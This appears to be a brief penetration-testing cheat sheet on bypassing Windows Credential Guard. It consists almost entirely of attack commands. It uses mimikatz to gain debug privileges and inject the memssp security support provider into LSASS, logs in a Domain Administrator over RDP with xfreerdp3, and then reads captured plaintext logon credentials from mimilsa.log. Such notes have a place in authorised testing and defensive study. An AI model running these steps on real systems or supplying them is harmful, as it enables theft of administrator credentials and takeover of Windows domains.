Verifying that Credential Guard is enabled
```
Get-ComputerInfo
```

## Credential Guard Bypass
### mimikatz
elevated system
```
privilege::debug
```

memssp injection
```
misc:memssp
```

logging in to the machine as a Domain Administrator
```
xfreerdp3 /u:"" /p:"" /v:192.168.x.x /dynamic-resolution
```

check mimilsa.log
```
type C:\Windows\System32\mimilsa.log
```
